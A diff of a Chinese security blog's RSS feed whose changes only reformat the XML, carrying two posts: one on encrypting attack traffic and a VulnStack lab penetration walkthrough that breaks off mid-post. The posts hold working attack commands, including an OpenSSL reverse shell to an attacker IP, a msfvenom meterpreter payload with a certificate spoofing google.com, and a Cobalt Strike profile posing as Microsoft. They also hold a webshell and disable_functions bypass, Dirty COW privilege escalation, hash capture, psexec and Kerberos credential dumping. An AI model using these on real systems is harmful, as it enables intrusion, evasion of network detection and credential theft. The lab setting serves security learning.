@@ -1,51 +1,50 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<?xml version="1.0" encoding="utf-8"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-    <channel>
-        <title>fragrant1001</title>
-        <link>https://fragrant1001.github.io/</link>
-        <description>Recent content on fragrant1001</description>
-        <generator>Hugo -- gohugo.io</generator>
-        <language>zh-Hans</language>
-        <lastBuildDate>Thu, 02 Nov 2023 10:02:40 +0800</lastBuildDate><atom:link href="https://fragrant1001.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>流量传输加密混淆</title>
-        <link>https://fragrant1001.github.io/post/2023/encryptedflow/</link>
-        <pubDate>Thu, 02 Nov 2023 10:02:40 +0800</pubDate>
-        
-        <guid>https://fragrant1001.github.io/post/2023/encryptedflow/</guid>
-        <description>&lt;img src="https://fragrant1001.github.io/post/2023/encryptedflow/beacon.jpg" alt="Featured image of post 流量传输加密混淆" /&gt;&lt;h3 id=&#34;openssl反弹shell&#34;&gt;Openssl反弹shell&lt;/h3&gt;
+<channel>
+<title>fragrant1001</title>
+<link>https://fragrant1001.github.io/</link>
+<description>Recent content on fragrant1001</description>
+<generator>Hugo -- gohugo.io</generator>
+<language>zh-Hans</language>
+<lastBuildDate>Thu, 02 Nov 2023 10:02:40 +0800</lastBuildDate><atom:link href="https://fragrant1001.github.io/index.xml" rel="self" type="application/rss+xml"/><item>
+<title>流量传输加密混淆</title>
+<link>https://fragrant1001.github.io/post/2023/encryptedflow/</link>
+<pubDate>Thu, 02 Nov 2023 10:02:40 +0800</pubDate>
+<guid>https://fragrant1001.github.io/post/2023/encryptedflow/</guid>
+<description>&lt;img src="https://fragrant1001.github.io/post/2023/encryptedflow/beacon.jpg" alt="Featured image of post 流量传输加密混淆" /&gt;&lt;h3 id="openssl反弹shell"&gt;Openssl反弹shell&lt;/h3&gt;
 &lt;p&gt;既然是openssl反弹的shell，那么流量自然是加密的。&lt;br&gt;
 攻击机：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//生成自签名证书
+&lt;pre tabindex="0"&gt;&lt;code&gt;//生成自签名证书
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 //监听本地端口
 openssl s_server -quiet -key key.pem -cert cert.pem -port 8989
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;被攻击机：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//反弹shell
+&lt;pre tabindex="0"&gt;&lt;code&gt;//反弹shell
 mkfifo /tmp/s; /bin/sh -i &amp;lt; /tmp/s 2&amp;gt;&amp;amp;1 | openssl s_client -quiet -connect 10.0.0.116:8989 &amp;gt; /tmp/s;rm /tmp/s
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image.png&#34;
-	width=&#34;2360&#34;
-	height=&#34;1290&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image_hu9f7c53e74f40e5e113f256748410628a_1267977_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/encryptedflow/image_hu9f7c53e74f40e5e113f256748410628a_1267977_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/encryptedflow/image.png"
+	width="2360"
+	height="1290"
+	srcset="https://fragrant1001.github.io/post/2023/encryptedflow/image_hu9f7c53e74f40e5e113f256748410628a_1267977_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/encryptedflow/image_hu9f7c53e74f40e5e113f256748410628a_1267977_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;opensslshell&#34;
+		alt="opensslshell"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;182&#34;
-		data-flex-basis=&#34;439px&#34;
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="439px"
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;msf流量加密&#34;&gt;msf流量加密&lt;/h3&gt;
+&lt;h3 id="msf流量加密"&gt;msf流量加密&lt;/h3&gt;
 &lt;p&gt;首先openssl生成证书，msfvenom生成木马的时候使用该证书。其次攻击机本地设置监听的时候要带上刚刚生成的证书文件。&lt;br&gt;
 攻击机：&lt;br&gt;
 生成木马&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//openssl生成证书
+&lt;pre tabindex="0"&gt;&lt;code&gt;//openssl生成证书
 openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj &amp;#34;/C=UK/ST=London/L=London/O=Development/CN=www.google.com&amp;#34; -keyout www.google.com.key -out www.google.com.crt &amp;amp;&amp;amp; cat www.google.com.key www.google.com.crt &amp;gt; www.google.com.pem &amp;amp;&amp;amp; rm -f www.google.com.key www.google.com.crt
 //msfvenom使用证书生成木马
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.116 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=www.google.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -a x64 --platform windows -o pentestlab.bat
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;配置加密监听&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use exploit/multi/handler
+&lt;pre tabindex="0"&gt;&lt;code&gt;use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_https
 set LHOST 10.0.0.116
 set LPORT 443
@@ -54,43 +53,43 @@ set StagerVerifySSLCert true
 exploit
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;被攻击机：&lt;br&gt;
 直接运行木马即可
-&lt;img src=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image-1.png&#34;
-	width=&#34;2082&#34;
-	height=&#34;1334&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image-1_huad5e14b259aeee482cca0751b8e4bb48_1587267_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/encryptedflow/image-1_huad5e14b259aeee482cca0751b8e4bb48_1587267_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;img src="https://fragrant1001.github.io/post/2023/encryptedflow/image-1.png"
+	width="2082"
+	height="1334"
+	srcset="https://fragrant1001.github.io/post/2023/encryptedflow/image-1_huad5e14b259aeee482cca0751b8e4bb48_1587267_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/encryptedflow/image-1_huad5e14b259aeee482cca0751b8e4bb48_1587267_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;加密后的流量&#34;
+		alt="加密后的流量"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;156&#34;
-		data-flex-basis=&#34;374px&#34;
+		class="gallery-image" 
+		data-flex-grow="156"
+		data-flex-basis="374px"
 	
 &gt;
 &lt;code&gt;show advanced&lt;/code&gt; 查看高级配置&lt;/p&gt;
-&lt;h3 id=&#34;cs加密混淆&#34;&gt;CS加密混淆&lt;/h3&gt;
+&lt;h3 id="cs加密混淆"&gt;CS加密混淆&lt;/h3&gt;
 &lt;p&gt;Cobalt Strike修改C2 profile&lt;/p&gt;
 &lt;p&gt;攻击机：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//生成证书并记住密码和填的字段
+&lt;pre tabindex="0"&gt;&lt;code&gt;//生成证书并记住密码和填的字段
 //frasec和frasec.store以及密码等都要要填写到profile文件里面
 keytool -genkey -alias frasec -keyalg RSA -validity 36500 -keystore frasec.store
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image-2.png&#34;
-	width=&#34;1788&#34;
-	height=&#34;686&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image-2_hue72c18e7a08c788388e39d997cec038c_648682_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/encryptedflow/image-2_hue72c18e7a08c788388e39d997cec038c_648682_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/encryptedflow/image-2.png"
+	width="1788"
+	height="686"
+	srcset="https://fragrant1001.github.io/post/2023/encryptedflow/image-2_hue72c18e7a08c788388e39d997cec038c_648682_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/encryptedflow/image-2_hue72c18e7a08c788388e39d997cec038c_648682_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;keytool create certification&#34;
+		alt="keytool create certification"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;260&#34;
-		data-flex-basis=&#34;625px&#34;
+		class="gallery-image" 
+		data-flex-grow="260"
+		data-flex-basis="625px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;新建frasec.profile配置文件，主要修改内容：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https-certificate {
+&lt;pre tabindex="0"&gt;&lt;code&gt;https-certificate {
     set CN       &amp;#34;Microsoft&amp;#34;; #Common Name
     set O        &amp;#34;MicrosoftUpdates&amp;#34;; #Organization Name
     set C        &amp;#34;en&amp;#34;; #Country
@@ -107,37 +106,36 @@ code-signer{
 }
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其它内容可做适当更改&lt;br&gt;
 启动服务端&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo ./teamserver 10.0.0.116 pass14 frasec.profile
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo ./teamserver 10.0.0.116 pass14 frasec.profile
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;客户端连接后生成https的木马即可，加密流量如下：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image-3.png&#34;
-	width=&#34;2436&#34;
-	height=&#34;814&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image-3_hu6e5f035865b2346a07115945fe6f5877_560436_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/encryptedflow/image-3_hu6e5f035865b2346a07115945fe6f5877_560436_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/encryptedflow/image-3.png"
+	width="2436"
+	height="814"
+	srcset="https://fragrant1001.github.io/post/2023/encryptedflow/image-3_hu6e5f035865b2346a07115945fe6f5877_560436_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/encryptedflow/image-3_hu6e5f035865b2346a07115945fe6f5877_560436_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;cs encrypted flow&#34;
+		alt="cs encrypted flow"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;299&#34;
-		data-flex-basis=&#34;718px&#34;
+		class="gallery-image" 
+		data-flex-grow="299"
+		data-flex-basis="718px"
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/rsmudge/Malleable-C2-Profiles&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;p&gt;&lt;a class="link" href="https://github.com/rsmudge/Malleable-C2-Profiles"  target="_blank" rel="noopener"
     &gt;https://github.com/rsmudge/Malleable-C2-Profiles&lt;/a&gt;&lt;/p&gt;
 </description>
-        </item>
-        <item>
-        <title>VulnStack内网靶场（三）</title>
-        <link>https://fragrant1001.github.io/post/2023/vulnstack03/</link>
-        <pubDate>Sat, 28 Oct 2023 15:52:39 +0800</pubDate>
-        
-        <guid>https://fragrant1001.github.io/post/2023/vulnstack03/</guid>
-        <description>&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/vulnstack03.jpg" alt="Featured image of post VulnStack内网靶场（三）" /&gt;&lt;p&gt;10.0.0.119和192.168.93.100是同一台机器，同时100的80、3360端口都会转发到192.168.93.120机器。&lt;/p&gt;
-&lt;h3 id=&#34;120-web服务器&#34;&gt;120-Web服务器&lt;/h3&gt;
+</item>
+<item>
+<title>VulnStack内网靶场（三）</title>
+<link>https://fragrant1001.github.io/post/2023/vulnstack03/</link>
+<pubDate>Sat, 28 Oct 2023 15:52:39 +0800</pubDate>
+<guid>https://fragrant1001.github.io/post/2023/vulnstack03/</guid>
+<description>&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/vulnstack03.jpg" alt="Featured image of post VulnStack内网靶场（三）" /&gt;&lt;p&gt;10.0.0.119和192.168.93.100是同一台机器，同时100的80、3360端口都会转发到192.168.93.120机器。&lt;/p&gt;
+&lt;h3 id="120-web服务器"&gt;120-Web服务器&lt;/h3&gt;
 &lt;p&gt;快速端口扫描: &lt;code&gt;nmap -Pn -p- -sS 10.0.0.119&lt;/code&gt;&lt;br&gt;
 固定端口扫版本以及用脚本扫: &lt;code&gt;nmap -Pn -p22,80,3306 -sC -sV 10.0.0.119&lt;/code&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PORT     STATE SERVICE VERSION
+&lt;pre tabindex="0"&gt;&lt;code&gt;PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)
 | ssh-hostkey: 
 |   1024 25:84:c6:cc:2c:8a:7b:8f:4a:7c:60:f1:a3:c9:b0:22 (DSA)
@@ -162,48 +160,48 @@ code-signer{
 |_  Auth Plugin Name: mysql_native_password
 MAC Address: 94:E2:3C:A5:00:23 (Intel Corporate)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;joomscan和dirsearch的到phpinfo文件1.php、后台目录和备份配置文件configuration.php~，得到数据库连接凭证和路径等敏感信息&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  public $user = &amp;#39;testuser&amp;#39;;
+&lt;pre tabindex="0"&gt;&lt;code&gt;  public $user = &amp;#39;testuser&amp;#39;;
 	public $password = &amp;#39;cvcvgjASD!@&amp;#39;;
 	public $db = &amp;#39;joomla&amp;#39;;
 	public $dbprefix = &amp;#39;am2zu_&amp;#39;;
 	public $live_site = &amp;#39;&amp;#39;;
 	public $secret = &amp;#39;gXN9Wbpk7ef3A4Ys&amp;#39;;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;登陆mysql并修改后台管理员密码&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;update am2zu_users set password=md5(&amp;#34;1234567&amp;#34;) where username=&amp;#39;administrator&amp;#39;;
+&lt;pre tabindex="0"&gt;&lt;code&gt;update am2zu_users set password=md5(&amp;#34;1234567&amp;#34;) where username=&amp;#39;administrator&amp;#39;;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;joomla后台新增模版文件getshell
-&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image.png&#34;
-	width=&#34;2492&#34;
-	height=&#34;1272&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image_hu9cbe861c28d2b944bd29d80b74bd01ee_814410_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image_hu9cbe861c28d2b944bd29d80b74bd01ee_814410_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/image.png"
+	width="2492"
+	height="1272"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack03/image_hu9cbe861c28d2b944bd29d80b74bd01ee_814410_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image_hu9cbe861c28d2b944bd29d80b74bd01ee_814410_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;joomlashell&#34;
+		alt="joomlashell"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;195&#34;
-		data-flex-basis=&#34;470px&#34;
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="470px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;蚁剑连接一句话木马之后发现不能执行命令，突破disable_fucntion&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://10.0.0.119/bypass_disablefunc.php?cmd=ifconfig&amp;amp;outpath=/tmp/xx&amp;amp;sopath=/var/www/html/bypass_disablefunc_x64.so
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-1.png&#34;
-	width=&#34;1470&#34;
-	height=&#34;1120&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-1_hu2d6adc7c65f50802d7648d654400941d_1130590_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-1_hu2d6adc7c65f50802d7648d654400941d_1130590_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;pre tabindex="0"&gt;&lt;code&gt;http://10.0.0.119/bypass_disablefunc.php?cmd=ifconfig&amp;amp;outpath=/tmp/xx&amp;amp;sopath=/var/www/html/bypass_disablefunc_x64.so
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/image-1.png"
+	width="1470"
+	height="1120"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack03/image-1_hu2d6adc7c65f50802d7648d654400941d_1130590_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-1_hu2d6adc7c65f50802d7648d654400941d_1130590_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;bypassdisablefunction&#34;
+		alt="bypassdisablefunction"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;131&#34;
-		data-flex-basis=&#34;315px&#34;
+		class="gallery-image" 
+		data-flex-grow="131"
+		data-flex-basis="315px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;没有主机ip说明做了反向代理，可能是nginx&lt;/p&gt;
 &lt;p&gt;初步收集一下信息，上传fscan扫一下c段&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;192.168.93.120:3306 open
+&lt;pre tabindex="0"&gt;&lt;code&gt;192.168.93.120:3306 open
 192.168.93.100:3306 open
 192.168.93.20:1433 open
 192.168.93.120:80 open
@@ -228,283 +226,282 @@ MAC Address: 94:E2:3C:A5:00:23 (Intel Corporate)
 [+] mysql:192.168.93.120:3306:root 123
 [+] mysql:192.168.93.100:3306:root 123
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到10、20、30都是windows且10是域控，其次是100就是有代理软件的机器，实际上web是在120上。也可以用&lt;code&gt;netstat -naplt&lt;/code&gt;看当前机器在跟哪台机器在通信。
-&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-2.png&#34;
-	width=&#34;1642&#34;
-	height=&#34;934&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-2_hue964d574e7a2c76931beeff569baf814_951443_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-2_hue964d574e7a2c76931beeff569baf814_951443_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/image-2.png"
+	width="1642"
+	height="934"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack03/image-2_hue964d574e7a2c76931beeff569baf814_951443_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-2_hue964d574e7a2c76931beeff569baf814_951443_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;100-120&#34;
+		alt="100-120"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;175&#34;
-		data-flex-basis=&#34;421px&#34;
+		class="gallery-image" 
+		data-flex-grow="175"
+		data-flex-basis="421px"
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;100出口服务器&#34;&gt;100出口服务器&lt;/h3&gt;
+&lt;h3 id="100出口服务器"&gt;100出口服务器&lt;/h3&gt;
 &lt;p&gt;在&lt;code&gt;/tmp/mysql/test.txt&lt;/code&gt;发现认证信息，可直接登录119机器。&lt;code&gt;ssh wwwuser@10.0.0.119 -oHostKeyAlgorithms=+ssh-dss&lt;/code&gt;一定要带上后面的参数。&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;adduser wwwuser
+&lt;pre tabindex="0"&gt;&lt;code&gt;adduser wwwuser
 passwd wwwuser_123Aqx
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-3.png&#34;
-	width=&#34;1388&#34;
-	height=&#34;842&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-3_hu3816e9d9ac6560a15505dda86349b68a_724108_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-3_hu3816e9d9ac6560a15505dda86349b68a_724108_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/image-3.png"
+	width="1388"
+	height="842"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack03/image-3_hu3816e9d9ac6560a15505dda86349b68a_724108_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-3_hu3816e9d9ac6560a15505dda86349b68a_724108_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;119&#34;
+		alt="119"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;164&#34;
-		data-flex-basis=&#34;395px&#34;
+		class="gallery-image" 
+		data-flex-grow="164"
+		data-flex-basis="395px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;脏牛dirtycow提权&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[wwwuser@anonymous ~]$ gcc -pthread dirty.c -o dirty -lcrypt  
+&lt;pre tabindex="0"&gt;&lt;code&gt;[wwwuser@anonymous ~]$ gcc -pthread dirty.c -o dirty -lcrypt  
 [wwwuser@anonymous ~]$ rm -rf /tmp/passwd.bak               
 [wwwuser@anonymous ~]$ gcc -pthread dirty.c -o dirty -lcrypt  
 [wwwuser@anonymous ~]$ ./dirty
 ……
 [wwwuser@anonymous ~]$ su firefart
 [wwwuser@anonymous ~]$ id
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-4.png&#34;
-	width=&#34;1388&#34;
-	height=&#34;768&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-4_huf2adc88c6218bfcfc380dda17876c344_423156_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-4_huf2adc88c6218bfcfc380dda17876c344_423156_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/image-4.png"
+	width="1388"
+	height="768"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack03/image-4_huf2adc88c6218bfcfc380dda17876c344_423156_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-4_huf2adc88c6218bfcfc380dda17876c344_423156_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;dirtycow&#34;
+		alt="dirtycow"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;180&#34;
-		data-flex-basis=&#34;433px&#34;
+		class="gallery-image" 
+		data-flex-grow="180"
+		data-flex-basis="433px"
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;20windows&#34;&gt;20windows&lt;/h3&gt;
+&lt;h3 id="20windows"&gt;20windows&lt;/h3&gt;
 &lt;ol&gt;
 &lt;li&gt;上传frpc做代理&lt;/li&gt;
 &lt;li&gt;上传Responder抓hash值&lt;/li&gt;
 &lt;li&gt;连接20的1433(密码和mysql的一样)访问100的smb服务&lt;code&gt;EXEC master.sys.xp_dirtree &amp;quot;\\192.168.93.100\ttttanything&amp;quot;,0,1&lt;/code&gt;&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-5.png&#34;
-	width=&#34;1254&#34;
-	height=&#34;870&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-5_hubfd579e7e6c1ef2beab82e73ac77dbd9_593596_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-5_hubfd579e7e6c1ef2beab82e73ac77dbd9_593596_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/image-5.png"
+	width="1254"
+	height="870"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack03/image-5_hubfd579e7e6c1ef2beab82e73ac77dbd9_593596_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-5_hubfd579e7e6c1ef2beab82e73ac77dbd9_593596_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;Respond&#34;
+		alt="Respond"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;144&#34;
-		data-flex-basis=&#34;345px&#34;
+		class="gallery-image" 
+		data-flex-grow="144"
+		data-flex-basis="345px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;jhon对hash暴破得到密码&lt;code&gt;123qwe!ASD&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;msf的psexec模块上线20机器&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 &amp;gt; use exploit/windows/smb/psexec
+&lt;pre tabindex="0"&gt;&lt;code&gt;msf6 &amp;gt; use exploit/windows/smb/psexec
 msf6 exploit(windows/smb/psexec) &amp;gt; set RHOSTS 192.168.93.20
 msf6 exploit(windows/smb/psexec) &amp;gt; setg proxies socks5:127.0.0.1:6000
 msf6 exploit(windows/smb/psexec) &amp;gt; set SMBUser administrator
 msf6 exploit(windows/smb/psexec) &amp;gt; set SMBPass 123qwe!ASD
 msf6 exploit(windows/smb/psexec) &amp;gt; set payload windows/x64/meterpreter/bind_tcp
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-6.png&#34;
-	width=&#34;1646&#34;
-	height=&#34;490&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-6_huba6ecac94e4f23f430422609ee7ee525_326981_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-6_huba6ecac94e4f23f430422609ee7ee525_326981_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/image-6.png"
+	width="1646"
+	height="490"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack03/image-6_huba6ecac94e4f23f430422609ee7ee525_326981_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-6_huba6ecac94e4f23f430422609ee7ee525_326981_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;20msf&#34;
+		alt="20msf"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;335&#34;
-		data-flex-basis=&#34;806px&#34;
+		class="gallery-image" 
+		data-flex-grow="335"
+		data-flex-basis="806px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;确定域控的ip: &lt;code&gt;ipconfig /all&lt;/code&gt;发现DNS服务器再ping一下即可&lt;/p&gt;
-&lt;h3 id=&#34;10域控&#34;&gt;10域控&lt;/h3&gt;
+&lt;h3 id="10域控"&gt;10域控&lt;/h3&gt;
 &lt;p&gt;20msf上线后通过加载kiwi抓认证密码&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;load kiwi
+&lt;pre tabindex="0"&gt;&lt;code&gt;load kiwi
 creds_kerberos
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-7.png&#34;
-	width=&#34;1638&#34;
-	height=&#34;760&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-7_hu25d855c14b724ee34599889b1166bbe5_414087_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-7_hu25d855c14b724ee34599889b1166bbe5_414087_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/image-7.png"
+	width="1638"
+	height="760"
